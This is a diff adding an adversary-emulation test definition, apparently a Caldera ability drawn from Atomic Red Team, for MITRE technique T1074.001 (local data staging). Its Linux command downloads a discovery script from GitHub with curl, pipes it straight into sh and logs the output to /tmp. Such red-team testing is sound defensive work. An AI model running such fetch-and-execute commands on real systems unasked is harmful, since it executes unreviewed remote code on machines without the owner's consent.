@@ -1,0 +1,45 @@
+- id: 39ce0303-ae16-4b9e-bb5b-4f53e8262066
+  name: Stage data from Discovery.sh
+  description: Utilize curl to download discovery.sh and execute a basic information
+    gathering shell script
+  tactic: collection
+  technique:
+    attack_id: T1074.001
+    name: 'Data Staged: Local Data Staging'
+  platforms:
+    linux:
+      sh:
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
+          | sh -s > /tmp/T1074.001_discovery.log
+        cleanup: 'rm #{output_file}'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - collection
+  - atomic-red-team
+  - t1074.001
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_file:
+        description: Location to save downloaded discovery.bat file
+        type: path
+        default: /tmp/T1074.001_discovery.log
+    dependencies:
+    - description: 'Check if curl is installed on the machine.
+
+        '
+      prereq_command: 'if [ -x "$(command -v curl)" ]; then echo "curl is installed";
+        else echo "curl is NOT installed"; exit 1; fi
+
+        '
+      get_prereq_command: 'which apt && apt update && apt install -y curl || which
+        pkg && pkg update && pkg install -y curl
+
+        '
+    technique_created: '2020-03-13T21:13:10.467Z'
+    atomic_guid: 39ce0303-ae16-4b9e-bb5b-4f53e8262066
+    import_timestamp: '2025-06-24T11:15:56.341490Z'
